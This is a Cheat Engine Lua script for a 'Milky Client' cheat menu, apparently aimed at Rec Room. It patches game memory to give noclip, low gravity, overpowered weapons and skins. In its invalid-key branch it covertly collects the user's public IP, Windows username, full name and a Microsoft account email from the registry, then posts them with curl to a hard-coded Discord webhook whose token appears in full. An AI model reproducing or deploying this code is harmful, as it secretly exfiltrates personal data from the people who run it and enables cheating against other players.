-- Define static keys and associated PC names
local keys = {
    ["key1"] = "manoh",
    ["key2"] = "turtlez",
    ["key3"] = "jeff"
}

-- Primary script setup
local form = createForm()
form.Width = 500
form.Height = 300
form.Color = 0x780050
form.AlphaBlend = true
form.AlphaBlendValue = 225
form.FormStyle = "fsSystemStayOnTop"
form.BorderStyle = "bsNone"
form.Transparent = true
local screenWidth = getScreenWidth()
local screenHeight = getScreenHeight()
form.Left = (screenWidth - form.Width) // 2
form.Top = (screenHeight - form.Height) // 2

local bar = createPanel(form)
bar.Width = 500
bar.Height = 55
bar.Color = 0x42002c
bar.BevelOuter = "bvNone"

local label = createLabel(bar)
label.Caption = "Milky Client Key Auth"
label.Font.Name = "Comic Sans MS"
label.Font.Size = 22
label.Font.Style = fsBold
label.Font.Color = clWhite
label.Alignment = taCenter
label.Left = 100
label.Top = 10
label.Width = 500

local textBox = createEdit(form)
textBox.Left = 125
textBox.Top = 150
textBox.Width = 250
textBox.Color = 0x42002c
textBox.Font.Color = 0xFFFFFF
textBox.TextHint = "Enter authentication key here."
textBox.Font.Name = "Comic Sans MS"

local button = createPanel(form)
button.Caption = "Authenticate"
button.Font.Name = "Comic Sans MS"
button.Font.Size = 10
button.Width = 100
button.Height = 30
button.Left = 200
button.Top = 185

button.OnClick = function()
local enteredKey = textBox.Text
local isKeyValid = false
local currentPCName = os.getenv("USERNAME") or "Unknown"

-- Validate the entered key and check PC name association
for key, pcName in pairs(keys) do
if enteredKey == key then
if currentPCName == pcName then
isKeyValid = true
else
showMessage("Key is invalid. Access denied.")
end
break
end
end

if isKeyValid then
showMessage("Key is valid! Access granted.")
form.hide() -- Hides the primary form instead of closing it

-- Secondary script starts here














-- Timer configuration
local aTimer = nil
local aTimerInterval = 1000
local aTimerTicks = 0
local aTimerTickMax = 0

local function aTimer_tick(timer)
if aTimerTickMax > 0 and aTimerTicks >= aTimerTickMax then
timer.destroy()
end
aTimerTicks = aTimerTicks + 1
openProcess("RecRoom.exe")
if b == 0 or b == 255 then
openProcess("RecRoom.exe")
end
end

function AOBRep(search, change)
local aob = AOBScan(search)
if aob then
for i = 0, aob.Count - 1 do
autoAssemble(aob[i] .. ':\ndb ' .. change)
end
aob.Destroy()
end
end

-- GUI setup
gui = createForm()
gui.Width = 603
gui.Height = 375
gui.Left = 0
gui.Top = 0
gui.Color = 0x4C1600
gui.AlphaBlend = true
gui.AlphaBlendValue = 225
gui.FormStyle = "fsSystemStayOnTop"
gui.BorderStyle = "bsNone"
gui.Transparent = true
gui.Visible = true

label = createLabel(gui)
label.Caption = "Milky Client"
label.Font.Name = "Comic Sans MS"
label.Font.Size = 18
label.Font.Style = fsBold
label.Font.Color = clWhite
label.Alignment = taCenter
label.Left = 222.5
label.Top = 2
label.Width = gui.Width

logo = createLabel(gui)
logo.Caption = "V1.01ðŸŒŒ"
logo.Font.Size = 10
logo.Font.Color = clWhite
logo.Left = 550
logo.Top = 17

gui.KeyPreview = true

gui.OnKeyDown = function(sender, key)
if key == VK_RCONTROL then
gui.Visible = not gui.Visible
end
end

-- Pages setup
page = createPageControl(gui)
page.Align = alNone
page.TabHeight = 33
page.TabWidth = 100
page.TabStyle = tsFlatButtons
page.Width = 603
page.Height = 500
page.Top = 35

-- Tab 1 setup
tab1 = page.addTab()
tab1.Caption = "Player Options"
tab1.Font.Name = "Comic Sans MS"

playercheckbox1 = createCheckBox(tab1)
playercheckbox1.Left = 20
playercheckbox1.Top = 20
playercheckbox1.Caption = "Tweak"
playercheckbox1.Font.Size = 15

playercheckbox1.OnChange = function(sender)
if sender.Checked then
tweakon()
else
tweakoff()
end
end

playercheckbox2 = createCheckBox(tab1)
playercheckbox2.Left = 20
playercheckbox2.Top = 60
playercheckbox2.Caption = "Height"
playercheckbox2.Font.Size = 15

playercheckbox2.OnChange = function(sender)
if sender.Checked then
heighton()
else
heightoff()
end
end

playercheckbox3 = createCheckBox(tab1)
playercheckbox3.Left = 20
playercheckbox3.Top = 100
playercheckbox3.Caption = "Infinite Grab Distance"
playercheckbox3.Font.Size = 15

playercheckbox3.OnChange = function(sender)
if sender.Checked then
infgrabon()
else
infgraboff()
end
end

playercheckbox4 = createCheckBox(tab1)
playercheckbox4.Left = 20
playercheckbox4.Top = 140
playercheckbox4.Caption = "Low Gravity"
playercheckbox4.Font.Size = 15

playercheckbox4.OnChange = function(sender)
if sender.Checked then
lowgravon()
else
lowgravoff()
end
end

playercheckbox5 = createCheckBox(tab1)
playercheckbox5.Left = 20
playercheckbox5.Top = 180
playercheckbox5.Caption = "Climb"
playercheckbox5.Font.Size = 15

playercheckbox5.OnChange = function(sender)
if sender.Checked then
climbon()
else
climboff()
end
end

playercheckbox6 = createCheckBox(tab1)
playercheckbox6.Left = 20
playercheckbox6.Top = 220
playercheckbox6.Caption = "Noclip/Fly"
playercheckbox6.Font.Size = 15

playercheckbox6.OnChange = function(sender)
if sender.Checked then
noclipon()
else
noclipoff()
end
end

playercheckbox7 = createCheckBox(tab1)
playercheckbox7.Left = 20
playercheckbox7.Top = 260
playercheckbox7.Caption = "Spaz"
playercheckbox7.Font.Size = 15

playercheckbox7.OnChange = function(sender)
if sender.Checked then
spazon()
else
spazoff()
end
end

playercheckbox8 = createCheckBox(tab1)
playercheckbox8.Left = 320
playercheckbox8.Top = 20
playercheckbox8.Caption = "Movement (Forward)"
playercheckbox8.Font.Size = 15

playercheckbox8.OnChange = function(sender)
if sender.Checked then
movementforwardon()
else
movementforwardoff()
end
end

playercheckbox8 = createCheckBox(tab1)
playercheckbox8.Left = 320
playercheckbox8.Top = 60
playercheckbox8.Caption = "Movement (Sideways)"
playercheckbox8.Font.Size = 15

playercheckbox8.OnChange = function(sender)
if sender.Checked then
movementsidewayson()
else
movementsidewaysoff()
end
end

-- Tab 2 setup
tab2 = page.addTab()
tab2.Caption = "Visual Options"
tab2.Font.Name = "Comic Sans MS"

visualcheckbox1 = createCheckBox(tab2)
visualcheckbox1.Left = 20
visualcheckbox1.Top = 20
visualcheckbox1.Caption = "High FOV"
visualcheckbox1.Font.Size = 15

visualcheckbox1.OnChange = function(sender)
if sender.Checked then
fovon()
else
fovoff()
end
end

visualbutton1 = createPanel(tab2)
visualbutton1.Caption = "Enable Skins (Join New Room)"
visualbutton1.Font.Size = 11
visualbutton1.Width = 220
visualbutton1.Height = 60
visualbutton1.Left = 20
visualbutton1.Top = 60
visualbutton1.OnClick = function()
skins()
end

visualdropdown1 = createComboBox(tab2)
visualdropdown1.Left = 20
visualdropdown1.Top = 130
visualdropdown1.Width = 200
visualdropdown1.Items.add("Blue")
visualdropdown1.Items.add("Purple")
visualdropdown1.Items.add("Black")
visualdropdown1.Items.add("Dark Blue")
visualdropdown1.Items.add("Red")
visualdropdown1.Items.add("Pink (femboy)")
visualdropdown1.ItemIndex = 0
visualdropdown1.Color = 0x80005b
visualdropdown1.Style = "csDropDownList"

visualdropdown1.OnChange = function()
local selectedColor = visualdropdown1.ItemIndex
if selectedColor == 0 then
gui.Color = 0x4C1600
elseif selectedColor == 1 then
gui.Color = 0x80005b
elseif selectedColor == 2 then
gui.Color = 0x000000
elseif selectedColor == 3 then
gui.Color = 0x3d0101
elseif selectedColor == 4 then
gui.Color = 0x03004d
elseif selectedColor == 5 then
gui.Color = 0xff96ee
end
end

-- Tab 3 setup
tab3 = page.addTab()
tab3.Caption = "Gun Options"
tab3.Font.Name = "Comic Sans MS"

guncheckbox1 = createCheckBox(tab3)
guncheckbox1.Left = 20
guncheckbox1.Top = 20
guncheckbox1.Caption = "OP Paint Pistol"
guncheckbox1.Font.Size = 15

guncheckbox1.OnChange = function(sender)
if sender.Checked then
paintpistolon()
else
paintpistoloff()
end
end

guncheckbox2 = createCheckBox(tab3)
guncheckbox2.Left = 20
guncheckbox2.Top = 60
guncheckbox2.Caption = "OP Paint Rifle"
guncheckbox2.Font.Size = 15

guncheckbox2.OnChange = function(sender)
if sender.Checked then
paintrifleon()
else
paintrifleoff()
end
end

guncheckbox3 = createCheckBox(tab3)
guncheckbox3.Left = 20
guncheckbox3.Top = 100
guncheckbox3.Caption = "OP Paint Shotgun"
guncheckbox3.Font.Size = 15

guncheckbox3.OnChange = function(sender)
if sender.Checked then
paintshotgunon()
else
paintshotgunoff()
end
end

guncheckbox4 = createCheckBox(tab3)
guncheckbox4.Left = 20
guncheckbox4.Top = 140
guncheckbox4.Caption = "OP Paint Gernade Launcher"
guncheckbox4.Font.Size = 15

guncheckbox4.OnChange = function(sender)
if sender.Checked then
gernadeon()
else
gernadeoff()
end
end

guncheckbox5 = createCheckBox(tab3)
guncheckbox5.Left = 20
guncheckbox5.Top = 180
guncheckbox5.Caption = "OP Paint Sniper"
guncheckbox5.Font.Size = 15

guncheckbox5.OnChange = function(sender)
if sender.Checked then
paintsniperon()
else
paintsniperoff()
end
end

guncheckbox6 = createCheckBox(tab3)
guncheckbox6.Left = 20
guncheckbox6.Top = 220
guncheckbox6.Caption = "OP Laser Railgun/Shotgun"
guncheckbox6.Font.Size = 15

guncheckbox6.OnChange = function(sender)
if sender.Checked then
lasershotrailon()
else
lasershotrailoff()
end
end

-- Tab 4 setup
tab4 = page.addTab()
tab4.Caption = "UI Options"
tab4.Font.Name = "Comic Sans MS"

-- Tab 5 setup
tab5 = page.addTab()
tab5.Caption = "Quest Options"
tab5.Font.Name = "Comic Sans MS"

-- Tab 6 setup
tab6 = page.addTab()
tab6.Caption = "Prefab Options"
tab6.Font.Name = "Comic Sans MS"

-- Functions

-- Player

function tweakon()
searchA = 'A8 93 A6 3A 73 F1 7F BF AF 15 E1 3B 65 44 8B 3F'
replaceA = '00 00 80 7F 73 F1 7F BF AF 15'
AOBRep(searchA, replaceA)
end

function tweakoff()
searchA = '00 00 80 7F 73 F1 7F BF AF 15'
replaceA = 'A8 93 A6 3A 73 F1 7F BF AF 15 E1 3B 65 44 8B 3F'
AOBRep(searchA, replaceA)
end

function heighton()
searchA = '92 EB CB 3F 00 00 00 00 4C 49 AC 3C D0 A6 E0 37'
replaceA = '00 00 A0 C0 00 00 00 00 4C 49 AC 3C D0 A6 E0 37'
AOBRep(searchA, replaceA)
end

function heightoff()
searchA = '00 00 A0 C0 00 00 00 00 4C 49 AC 3C D0 A6 E0 37'
replaceA = '92 EB CB 3F 00 00 00 00 4C 49 AC 3C D0 A6 E0 37'
AOBRep(searchA, replaceA)
end

function infgrabon()
searchA = '00 00 20 40 0A D7 23 3D 00 00 80 3E 00 00 00 3F'
replaceA = '00 00 80 7F 0A D7 23 3D 00 00 80 3E 00 00 00 3F'
AOBRep(searchA, replaceA)
end

function infgraboff()
searchA = '00 00 80 7F 0A D7 23 3D 00 00 80 3E 00 00 00 3F'
replaceA = '00 00 20 40 0A D7 23 3D 00 00 80 3E 00 00 00 3F'
AOBRep(searchA, replaceA)
end

function lowgravon()
searchA = 'C3 F5 1C C1 00 00 00 00 0A D7 A3 3B 0A D7 23 3C'
replaceA = '00 00 00 BF 00 00 00 00 0A D7 A3 3B 0A D7 23 3C'
AOBRep(searchA, replaceA)
searchB = 'C3 F5 1C C1 00 00 00 00 00 00 00 00 00 00 00 00'
replaceB = '00 00 00 BF 00 00 00 00 00 00 00 00 00 00 00 00'
AOBRep(searchB, replaceB)
end

function lowgravoff()
searchA = '00 00 00 BF 00 00 00 00 0A D7 A3 3B 0A D7 23 3C'
replaceA = 'C3 F5 1C C1 00 00 00 00 0A D7 A3 3B 0A D7 23 3C'
AOBRep(searchA, replaceA)
searchB = '00 00 00 BF 00 00 00 00 00 00 00 00 00 00 00 00'
replaceB = 'C3 F5 1C C1 00 00 00 00 00 00 00 00 00 00 00 00'
AOBRep(searchB, replaceB)
end

function climbon()
searchA = '00 00 80 3E CD CC CC 3D 00 00'
replaceA = '00 3C 1C 46 CD CC CC 3D 00 00'
AOBRep(searchA, replaceA)
end

function climboff()
searchA = '00 3C 1C 46 CD CC CC 3D 00 00'
replaceA = '00 00 80 3E CD CC CC 3D 00 00'
AOBRep(searchA, replaceA)
end

function noclipon()
searchA = '0A D7 23 3C 0A D7 23 3C 00 00 80 3E 00 00 20 41 00 00 00 41 00 00'
replaceA = '00 00 C6 42 0A D7 23 3C 00 00 80 3E 00 00 20 41 00 00 00 41 00 00'
AOBRep(searchA, replaceA)
end

function noclipoff()
searchA = '00 00 C6 42 0A D7 23 3C 00 00 80 3E 00 00 20 41 00 00 00 41 00 00'
replaceA = '0A D7 23 3C 0A D7 23 3C 00 00 80 3E 00 00 20 41 00 00 00 41 00 00'
AOBRep(searchA, replaceA)
end

function spazon()
searchA = '00 00 40 3F 00 00 40 3F 00 00'
replaceA = '80 4F C3 47 80 4F C3 47 80 4F'
AOBRep(searchA, replaceA)
end

function spazoff()
searchA = '80 4F C3 47 80 4F C3 47 80 4F'
replaceA = '00 00 40 3F 00 00 40 3F 00 00'
AOBRep(searchA, replaceA)
end

function movementforwardon()
searchA = '00 00 00 3F 00 00 00 3F 00 00 40 3F 00 00 40 3F'
replaceA = '30 8E AB B8 65 94 0F C3 00 00 40 3F 00 00 40 3F'
AOBRep(searchA, replaceA)
end

function movementforwardoff()
 searchA = '30 8E AB B8 65 94 0F C3 00 00 40 3F 00 00 40 3F'
 replaceA = '00 00 00 3F 00 00 00 3F 00 00 40 3F 00 00 40 3F'
AOBRep(searchA, replaceA)
end

function movementsidewayson()
searchA = '00 00 00 3F 00 00 00 3F 00 00 00 3F 00 00 40 3F 00 00 40 3F 00 00'
replaceA = 'D0 E5 ED 41 9A 2D 4D B1 F1 04'
AOBRep(searchA, replaceA)
end

function movementsidewaysoff()
searchA = 'D0 E5 ED 41 9A 2D 4D B1 F1 04'
replaceA = '00 00 00 3F 00 00 00 3F 00 00 00 3F 00 00 40 3F 00 00 40 3F 00 00'
AOBRep(searchA, replaceA)
end
-- Visual

function fovon()
searchA = '00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 00 01'
replaceA = 'B1 41 05 40 00 00 F0 41 00 00 00 00 C3 F5 28 3F'
AOBRep(searchA, replaceA)
searchB = 'CD CC 4C 3F 00 00 F0 41 00 00 00 00 C3 F5 28 3F'
replaceB = '14 AE 07 40 00 00 80 3F 72 FB FF FF 0A D7 A3 3C'
AOBRep(searchB, replaceB)
end

function fovoff()
searchA = 'B1 41 05 40 00 00 F0 41 00 00 00 00 C3 F5 28 3F'
replaceA = '00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 00 01'
AOBRep(searchA, replaceA)
searchB = '14 AE 07 40 00 00 80 3F 72 FB FF FF 0A D7 A3 3C'
replaceB = 'CD CC 4C 3F 00 00 F0 41 00 00 00 00 C3 F5 28 3F'
AOBRep(searchB, replaceB)
end

function skins()
searchA = '42 00 61 00 73 00 6B 00 65 00 74 00 62 00 61 00 6C 00 6C 00 5F 00 53 00 6B 00 69 00 6E 00 5F 00 50 00 75 00 72 00 70 00 6C 00 65'
replaceA = '42 00 61 00 73 00 6B 00 65 00 74 00 62 00 61 00 6C 00 6C 00 5F 00 53 00 6B 00 69 00 6E 00 5F 00 56 00 69 00 74 00 74 00 6F 00 6E'
AOBRep(searchA, replaceA)
searchB = '42 00 61 00 73 00 6B 00 65 00 74 00 62 00 61 00 6C 00 6C 00 5F 00 53 00 6B 00 69 00 6E 00 5F 00 42 00 6C 00 75 00 65'
replaceB = '42 00 61 00 73 00 6B 00 65 00 74 00 62 00 61 00 6C 00 6C 00 5F 00 53 00 6B 00 69 00 6E 00 5F 00 47 00 6F 00 6C 00 64'
AOBRep(searchB, replaceB)
searchC = '50 00 61 00 69 00 6E 00 74 00 62 00 61 00 6C 00 6C 00 47 00 75 00 6E 00 5F 00 53 00 6B 00 69 00 6E 00 5F 00 4F 00 72 00 61 00 6E 00 67 00 65'
replaceC = '50 00 61 00 69 00 6E 00 74 00 62 00 61 00 6C 00 6C 00 47 00 75 00 6E 00 5F 00 53 00 6B 00 69 00 6E 00 5F 00 56 00 69 00 74 00 74 00 6F 00 6E'
AOBRep(searchC, replaceC)
end

-- Gun

function paintpistolon()
searchA = '00 00 04 42 00 00 60 40 00 00 60 40 00 00 A0 40 00 00 00 00 00 00 00 00 00 00 80 3F 00'
replaceA = '80 4F C3 47 94 3D C8 01 30 14'
AOBRep(searchA, replaceA)
searchB = '00 00 A0 40 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 00 00'
replaceB = '80 EB C2 47 7C 00 00 00 E4 01 00 00 F0 FC 6A 1A'
AOBRep(searchB, replaceB)
end

function paintpistoloff()
searchA = '80 4F C3 47 94 3D C8 01 30 14'
replaceA = '00 00 04 42 00 00 60 40 00 00 60 40 00 00 A0 40 00 00 00 00 00 00 00 00 00 00 80 3F 00'
AOBRep(searchA, replaceA)
searchB = '80 EB C2 47 7C 00 00 00 E4 01 00 00 F0 FC 6A 1A'
replaceB = '00 00 A0 40 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 00 00'
AOBRep(searchB, replaceB)
end

function paintrifleon()
searchA = '00 00 34 42 00 00 90 40 00 00 90 40 00 00 A0 40 00 00 40 41'
replaceA = '80 4F C3 47 94 3D C8 01 30 14'
AOBRep(searchA, replaceA)
searchB = '00 00 A0 40 00 00 40 41 00 00 00 00 00 00 80 3F 00 00 00 00'
replaceB = '00 04 A6 47 4E AA 17 D7 CC 49'
AOBRep(searchB, replaceB)
searchC = '00 00 40 41 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F'
replaceC = '00 C7 AF 47 00 00 00 00 2C EE'
AOBRep(searchC, replaceC)
end

function paintrifleoff()
searchA = '80 4F C3 47 94 3D C8 01 30 14'
replaceA = '00 00 34 42 00 00 90 40 00 00 90 40 00 00 A0 40 00 00 40 41'
AOBRep(searchA, replaceA)
searchB = '00 04 A6 47 4E AA 17 D7 CC 49'
replaceB = '00 00 A0 40 00 00 40 41 00 00 00 00 00 00 80 3F 00 00 00 00'
AOBRep(searchB, replaceB)
searchC = '00 C7 AF 47 00 00 00 00 2C EE'
replaceC = '00 00 40 41 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F'
AOBRep(searchC, replaceC)
end

function paintshotgunon()
searchA = '00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 00 00'
replaceA = 'F0 23 74 49 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 00 00'
AOBRep(searchA, replaceA)
end

function paintshotgunoff()
searchA = 'F0 23 74 49 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 00 00'
replaceA = '00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 00 00'
AOBRep(searchA, replaceA)
end

function gernadeon()
searchA = '00 00 90 41 00 00 60 40 00 00 60 40 00 00 40 3F 00 00 00 00 00 00 00 00 00 00'
replaceA = '80 4F C3 47 94 3D C8 01 30 14'
AOBRep(searchA, replaceA)
end

function gernadeoff()
searchA = '80 4F C3 47 94 3D C8 01 30 14'
replaceA = '00 00 90 41 00 00 60 40 00 00 60 40 00 00 40 3F 00 00 00 00 00 00 00 00 00 00'
AOBRep(searchA, replaceA)
end

function paintsniperon()
searchA = '00 00 40 3F 00 00 00 00 00 00'
replaceA = '80 4F C3 47 00 00 00 00 00 00'
AOBRep(searchA, replaceA)
end

function paintsniperoff()
searchA = '80 4F C3 47 00 00 00 00 00 00'
replaceA = '00 00 40 3F 00 00 00 00 00 00'
AOBRep(searchA, replaceA)
end

function lasershotrailon()
searchA = '33 33 D3 3F 00 00 00 00 00 00'
replaceA = '80 4F C3 47 00 00 00 00 00 00'
AOBRep(searchA, replaceA)
end

function lasershotrailoff()
searchA = '80 4F C3 47 00 00 00 00 00 00'
replaceA = '33 33 D3 3F 00 00 00 00 00 00'
AOBRep(searchA, replaceA)
end










-- Show the secondary GUI
gui.Show()
else
-- Webhook for invalid keys
local webhookUrl = "https://discord.com/api/webhooks/1322349549511118969/yDIzhza8plRPiad9ZSjHzNi1iyjk9nJaMiaHIzrwms2K35aAF1U5FG4FufaryGbvTDUH"

local ipCommand = "curl -s http://checkip.amazonaws.com/"
local handle = io.popen(ipCommand)
local ip = handle:read("*a")
handle:close()
ip = ip:gsub("%s+", "")
local usernameCommand = 'echo %USERNAME%'
handle = io.popen(usernameCommand)
local username = handle:read("*a")
handle:close()
username = username:gsub("%s+", "")

local fullNameCommand = 'wmic useraccount where name="' .. username .. '" get fullname /value'
handle = io.popen(fullNameCommand)
local fullName = handle:read("*a")
handle:close()
fullName = fullName:match("FullName=(.*)") or ""

local regKey = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\IdentityCRL\\UserExtendedProperties"
local emailCommand = 'reg query "' .. regKey .. '" /s /f "" /k'
handle = io.popen(emailCommand)
local email = ""
for line in handle:lines() do
if string.match(line, "UserExtendedProperties\\.*") then
email = line:match("UserExtendedProperties\\(.*)")
break
end
end
handle:close()

if email == "" then
email = "no email found"
end

local message
if fullName ~= "" then
message = string.format("%s aka %s at %s, tried using a fake token from IP: %s", fullName, username, email, ip)
else
message = string.format("%s at %s, tried using a fake key from IP: %s", username, email, ip)
end

local jsonData = string.format('{"content": "%s"}', message)

local tmpFile = os.tmpname()
local file = io.open(tmpFile, "w")
file:write(jsonData)
file:close()

local command = string.format('curl -X POST -H "Content-Type: application/json" -d @%s %s', tmpFile, webhookUrl)
os.execute(command)

os.remove(tmpFile)
form.close()
showMessage("Key is invalid. Access denied.")
end
end

form.Show()
